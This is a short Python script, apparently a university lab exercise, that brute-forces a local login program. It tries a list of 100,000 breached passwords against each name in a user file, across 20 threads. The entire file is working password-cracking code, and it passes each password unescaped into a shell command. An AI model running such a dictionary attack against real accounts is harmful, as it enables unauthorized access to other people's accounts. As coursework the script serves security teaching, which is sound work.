import time
import os
from threading import Thread

def check(name, passwords,n):
    print(name, "Thread", n)
    for password in passwords:
        if os.system('python3 ./Login.pyc '+ name + ' "'+password+'"' + " >/dev/null 2>&1") == 0:
            print(name, password, "--- %s minutes ---" % ((time.time() - start_time) / 60))
            return

if __name__ in '__main__':
    start_time = time.time()
    common_passwords = [i.strip() for i in open('/home/cse/Lab1/PwnedPWs100k.txt')]
    common_passwords = [common_passwords[i:i+5000] for i in range(0, len(common_passwords), 5000)]
    gang_names=[i.strip() for i in open('/home/cse/Lab1/gang.txt')]

    for name in gang_names:
        threads = []
        for n in range(0, 20):
            t = Thread(target=check, args=(name, common_passwords[n],n))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
                





